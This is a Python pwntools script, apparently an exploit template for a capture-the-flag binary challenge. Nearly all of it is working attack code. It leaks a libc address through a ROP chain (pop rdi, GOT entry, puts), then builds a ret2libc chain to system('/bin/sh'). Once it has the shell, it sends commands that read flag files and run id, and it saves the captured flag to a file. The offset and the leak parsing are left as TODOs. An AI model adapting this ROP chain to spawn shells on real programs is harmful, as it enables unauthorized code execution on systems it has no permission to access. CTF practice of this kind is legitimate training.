#!/usr/bin/env python3
from pwn import *
import os, re

BIN = os.getenv("BIN", "./chall")
LIBC = os.getenv("LIBC", "./libc.so.6")
HOST = os.getenv("HOST", "")
PORT = int(os.getenv("PORT", "0"))
REMOTE = os.getenv("REMOTE", "0") == "1"
OFFSET = int(os.getenv("OFFSET", "0"))  # TODO
FLAG_RE = rb"[A-Za-z0-9_@.-]{2,32}\{[^\r\n}]{1,200}\}"

elf = context.binary = ELF(BIN, checksec=False)
libc = ELF(LIBC, checksec=False) if os.path.exists(LIBC) else None
context.log_level = os.getenv("LOG", "info")


def start():
    return remote(HOST, PORT) if REMOTE else process(BIN)


def flag_scan(data: bytes):
    print(data.decode(errors="replace"))
    m = re.search(FLAG_RE, data)
    if m:
        flag = m.group(0).decode(errors="replace")
        open("agent_flag.txt", "w", encoding="utf-8").write(flag + "\n")
        log.success(flag)


def rop_pop_rdi():
    rop = ROP(elf)
    return rop.find_gadget(["pop rdi", "ret"])[0]


def leak_stage():
    io = start()
    pop_rdi = rop_pop_rdi()
    ret = ROP(elf).find_gadget(["ret"])[0]
    leak_sym = os.getenv("LEAK_SYM", "puts")
    main = elf.sym.get("main")
    if not main:
        raise SystemExit("TODO: set reentry address")
    payload = flat({OFFSET: [ret, pop_rdi, elf.got[leak_sym], elf.plt["puts"], main]})
    # TODO: sync prompt if needed, e.g. io.sendlineafter(b'> ', payload)
    io.sendline(payload)
    data = io.recvuntil(b"\n", timeout=2) + io.recv(timeout=2)
    io.close()
    return data


def exploit_stage(libc_base: int):
    if libc is None:
        raise SystemExit("LIBC required for final ret2libc stage")
    libc.address = libc_base
    pop_rdi = rop_pop_rdi()
    ret = ROP(elf).find_gadget(["ret"])[0]
    payload = flat({OFFSET: [ret, pop_rdi, next(libc.search(b"/bin/sh\x00")), libc.sym["system"]]})
    io = start()
    io.sendline(payload)
    io.sendline(b"cat flag* 2>/dev/null || cat /flag 2>/dev/null || id")
    flag_scan(io.recvall(timeout=3))


leak_data = leak_stage()
print(leak_data)
# TODO: parse exact leaked bytes. Example:
# leak = u64(leak_data.split(b'\n')[0].ljust(8, b'\x00'))
# libc_base = leak - libc.sym[os.getenv('LEAK_SYM', 'puts')]
# exploit_stage(libc_base)
raise SystemExit("TODO: parse leak_data, compute libc_base, then call exploit_stage(libc_base)")
